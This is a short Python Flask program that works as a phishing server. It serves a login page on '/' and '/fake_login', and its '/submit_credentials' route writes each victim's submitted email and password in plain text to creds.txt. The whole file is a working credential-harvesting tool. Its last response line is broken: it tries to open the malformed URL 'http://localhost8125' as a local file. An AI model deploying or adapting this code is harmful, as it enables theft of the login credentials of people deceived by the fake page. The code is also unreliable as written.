from flask import Flask, request

app = Flask(__name__)

@app.route("/fake_login", methods=["GET"])
@app.route("/", methods=["GET"])
def show_login():
    return open("/var/www/html/index.html").read()

@app.route("/submit_credentials", methods=["POST"])
def capture():
    email = request.form.get("email")
    password = request.form.get("password")
    with open("creds.txt", "a") as f:
        f.write(f"Email: {email}, Password: {password}\\n")
    return open("http://localhost8125").read()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, threaded=False)

